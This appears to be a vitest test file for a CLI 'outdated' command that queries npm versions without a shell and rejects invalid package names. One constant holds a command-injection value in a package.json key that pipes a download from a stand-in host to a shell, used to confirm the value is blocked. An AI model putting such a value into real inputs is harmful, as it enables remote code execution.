import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const mocks = vi.hoisted(() => ({ spawnSync: vi.fn(), logWarn: vi.fn() }));
vi.mock("node:child_process", () => ({ spawnSync: mocks.spawnSync }));
vi.mock("../../src/logger.js", () => ({
  logger: { warn: mocks.logWarn, error: vi.fn(), info: vi.fn() },
}));
vi.mock("ora", () => {
  const spinner = { start: (): unknown => spinner, stop: (): unknown => spinner };
  return { default: () => spinner };
});

import { outdatedCommand } from "../../src/commands/outdated.js";

const EVIL_KEY = "@tuttiai/x; curl evil.example | sh";

describe("outdatedCommand", () => {
  let dir: string;
  let log: ReturnType<typeof vi.spyOn>;

  function writeDeps(dependencies: Record<string, string>): void {
    writeFileSync(join(dir, "package.json"), JSON.stringify({ dependencies }));
  }

  function output(): string {
    return log.mock.calls.map((call) => call.map(String).join(" ")).join("\n");
  }

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "tutti-outdated-"));
    vi.spyOn(process, "cwd").mockReturnValue(dir);
    vi.spyOn(process, "exit").mockImplementation((code) => {
      throw new Error(`exit ${String(code)}`);
    });
    log = vi.spyOn(console, "log").mockImplementation(() => undefined);
    vi.spyOn(console, "error").mockImplementation(() => undefined);
    mocks.spawnSync.mockReset();
    mocks.logWarn.mockReset();
    mocks.spawnSync.mockReturnValue({ status: 0, stdout: "1.2.0\n" });
  });

  afterEach(() => {
    vi.restoreAllMocks();
    rmSync(dir, { recursive: true, force: true });
  });

  it("asks npm for each @tuttiai version with an argument array and no shell", () => {
    writeDeps({ "@tuttiai/core": "^1.0.0", chalk: "5.6.2" });
    outdatedCommand();

    expect(mocks.spawnSync).toHaveBeenCalledTimes(1);
    expect(mocks.spawnSync).toHaveBeenCalledWith(
      "npm",
      ["view", "@tuttiai/core", "version"],
      expect.objectContaining({ shell: false, stdio: "pipe" }),
    );
    expect(output()).toContain("1 package(s) can be updated.");
  });

  it("skips an invalid package.json key with a warning and never passes it to npm", () => {
    writeDeps({ [EVIL_KEY]: "1.0.0", "@tuttiai/core": "1.2.0" });
    outdatedCommand();

    expect(mocks.spawnSync).toHaveBeenCalledTimes(1);
    expect(JSON.stringify(mocks.spawnSync.mock.calls)).not.toContain("curl");
    expect(mocks.logWarn).toHaveBeenCalledWith(`Skipping ${JSON.stringify(EVIL_KEY)}: not a valid npm package name.`);
    expect(output()).toContain("All packages are up to date.");
  });

  it("shows ? as the latest version when npm fails", () => {
    writeDeps({ "@tuttiai/core": "^1.0.0" });
    mocks.spawnSync.mockReturnValue({ status: 1, stdout: "" });
    outdatedCommand();

    expect(output()).toMatch(/@tuttiai\/core\s+1\.0\.0\s+\?/);
  });

  it("shows ? when npm cannot be found", () => {
    writeDeps({ "@tuttiai/core": "^1.0.0" });
    const error = Object.assign(new Error("spawnSync npm ENOENT"), { code: "ENOENT" });
    mocks.spawnSync.mockReturnValue({ status: null, stdout: null, error });
    outdatedCommand();

    expect(output()).toMatch(/@tuttiai\/core\s+1\.0\.0\s+\?/);
  });

  it("exits 1 and runs nothing without a package.json", () => {
    expect(() => outdatedCommand()).toThrow("exit 1");
    expect(mocks.spawnSync).not.toHaveBeenCalled();
  });
});
